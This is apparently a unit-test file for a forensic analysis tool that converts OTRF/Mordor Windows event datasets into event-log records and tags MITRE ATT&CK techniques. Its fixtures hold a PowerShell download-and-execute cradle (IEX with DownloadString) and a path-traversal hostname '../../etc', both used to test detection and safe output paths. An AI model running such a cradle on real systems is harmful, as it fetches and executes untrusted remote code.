"""Event datasets (OTRF/Mordor, the lab's captures and recordings): JSON events with no host.info
become Elrond hosts with their events in cooked/evt/, in Artemis's event-log shape.

Run: python3 -m unittest tests/unit/test_event_dataset.py
"""
import json
import os
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from dernvale.core import event_dataset, gandalf  # noqa: E402
from dernvale.process.extractions.artemis import eventlog_techniques  # noqa: E402

# As OTRF publishes them: flat, with Winlogbeat/NXLog fields alongside the event's own
SYSMON_PROCESS = {
    "@timestamp": "2020-05-01T23:56:12.123Z", "Hostname": "SCRANTON.dmevals.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceName": "Microsoft-Windows-Sysmon",
    "EventID": 1, "RecordNumber": 4242, "Level": "Information",
    "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe", "@version": "1", "port": 60737, "tags": ["mordorDataset"],
}
POWERSHELL_SCRIPT = {
    "@timestamp": "2020-05-01T23:57:00.000Z", "Hostname": "NASHUA.dmevals.local",
    "Channel": "Microsoft-Windows-PowerShell/Operational", "SourceName": "Microsoft-Windows-PowerShell",
    "EventID": "4104", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
}
NOT_AN_EVENT = {"name": "lab_persistence", "techniques": ["T1547.001"]}


def write_zip(path, members):
    with zipfile.ZipFile(path, "w") as z:
        for name, body in members.items():
            z.writestr(name, body)


class EventDatasetTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        self.acq = root / "acquisitions"
        self.out = root / "out"
        self.acq.mkdir()
        self.out.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def assess(self):
        allimgs = {}
        gandalf.assess_gandalf(False, True, False, False, False, False, {}, str(self.acq) + "/", os.getcwd(),
                               False, [], str(self.out) + "/", "", allimgs, {}, "", False, False)
        return allimgs

    def test_to_artemis_moves_system_fields_and_drops_transport(self):
        rec = event_dataset.to_artemis(SYSMON_PROCESS)
        system = rec["data"]["Event"]["System"]
        data = rec["data"]["Event"]["EventData"]
        self.assertEqual(system["EventID"], 1)
        self.assertEqual(system["Channel"], "Microsoft-Windows-Sysmon/Operational")
        self.assertEqual(system["Computer"], "SCRANTON.dmevals.local")
        self.assertEqual(system["EventRecordID"], 4242)
        self.assertEqual(system["Provider"], {"#attributes": {"Name": "Microsoft-Windows-Sysmon"}})
        self.assertEqual(system["TimeCreated"], {"#attributes": {"SystemTime": "2020-05-01T23:56:12.123Z"}})
        self.assertEqual(data["CommandLine"], "cmd.exe /c whoami")
        for transport in ("@version", "port", "tags", "Hostname"):
            self.assertNotIn(transport, data)
        self.assertEqual(rec["@timestamp"], "2020-05-01T23:56:12.123Z")

    def test_string_event_ids_become_numbers(self):
        rec = event_dataset.to_artemis(POWERSHELL_SCRIPT)
        self.assertEqual(rec["data"]["Event"]["System"]["EventID"], 4104)

    def test_converted_records_are_tagged_like_evtx(self):
        records = [event_dataset.to_artemis(r) for r in (SYSMON_PROCESS, POWERSHELL_SCRIPT)]
        found = eventlog_techniques(records)
        self.assertIn("T1059.001", found)   # PowerShell 4104
        self.assertIn("T1059.003", found)   # cmd /c
        self.assertIn("T1105", found)       # DownloadString

    def test_otrf_zip_becomes_one_host_per_computer(self):
        lines = "\n".join(json.dumps(r) for r in (SYSMON_PROCESS, POWERSHELL_SCRIPT, SYSMON_PROCESS))
        write_zip(self.acq / "apt29_evals_day1_manual.zip", {"apt29_evals_day1_manual.json": lines})
        allimgs = self.assess()

        self.assertEqual(allimgs, {
            str(self.out / "NASHUA.dmevals.local" / "artefacts" / "raw"): "NASHUA.dmevals.local::Windows",
            str(self.out / "SCRANTON.dmevals.local" / "artefacts" / "raw"): "SCRANTON.dmevals.local::Windows",
        })
        evt = self.out / "SCRANTON.dmevals.local" / "artefacts" / "cooked" / "evt" / "apt29_evals_day1_manual.json"
        records = json.loads(evt.read_text())
        self.assertEqual(len(records), 2)
        self.assertEqual(records[0]["data"]["Event"]["System"]["EventID"], 1)
        self.assertTrue((self.out / "SCRANTON.dmevals.local" / "artefacts" / "raw").is_dir())
        self.assertIn("T1059.003", (self.out / "mitre_techniques.txt").read_text())
        self.assertFalse((self.out / gandalf.STAGING_DIR).exists())

    def test_json_array_dataset_is_read_too(self):
        # The lab's capture writes JSON lines; some datasets are one array
        write_zip(self.acq / "lab_discovery.zip", {"lab_discovery.json": json.dumps([SYSMON_PROCESS])})
        allimgs = self.assess()
        self.assertEqual(list(allimgs.values()), ["SCRANTON.dmevals.local::Windows"])

    def test_zip_without_events_or_host_info_is_still_skipped(self):
        write_zip(self.acq / "notes.zip", {"expected.json": json.dumps(NOT_AN_EVENT)})
        self.assertEqual(self.assess(), {})

    def test_events_with_no_hostname_take_the_dataset_name(self):
        rec = dict(SYSMON_PROCESS)
        del rec["Hostname"]
        write_zip(self.acq / "lab_persistence.zip", {"lab_persistence.json": json.dumps(rec)})
        self.assertEqual(list(self.assess().values()), ["lab_persistence::Windows"])

    def test_hostile_hostname_cannot_escape_the_output(self):
        rec = dict(SYSMON_PROCESS, Hostname="../../etc")
        write_zip(self.acq / "x.zip", {"x.json": json.dumps(rec)})
        allimgs = self.assess()
        (raw,) = allimgs
        self.assertTrue(Path(raw).resolve().is_relative_to(self.out.resolve()))


    def test_large_hosts_are_split_below_the_ioc_size_limit(self):
        # IOC extraction skips files of 10 MB or more, so a big host is written in parts
        lines = self.out / "host.jsonl"
        lines.write_text("\n".join(json.dumps(event_dataset.to_artemis(dict(SYSMON_PROCESS, RecordNumber=i)))
                                   for i in range(50)) + "\n")
        parts = event_dataset.write_json_arrays(str(lines), str(self.out / "evt"), "big", part_bytes=4000)
        self.assertGreater(len(parts), 1)
        self.assertTrue(parts[0].endswith("big-0001.json"))
        records = [r for part in parts for r in json.loads(Path(part).read_text())]
        self.assertEqual([r["data"]["Event"]["System"]["EventRecordID"] for r in records], list(range(50)))
        self.assertTrue(all(os.path.getsize(part) <= 4000 for part in parts))

    def test_a_small_host_is_one_file(self):
        lines = self.out / "host.jsonl"
        lines.write_text(json.dumps(event_dataset.to_artemis(SYSMON_PROCESS)) + "\n")
        parts = event_dataset.write_json_arrays(str(lines), str(self.out / "evt"), "small")
        self.assertEqual([Path(p).name for p in parts], ["small.json"])

if __name__ == "__main__":
    unittest.main()
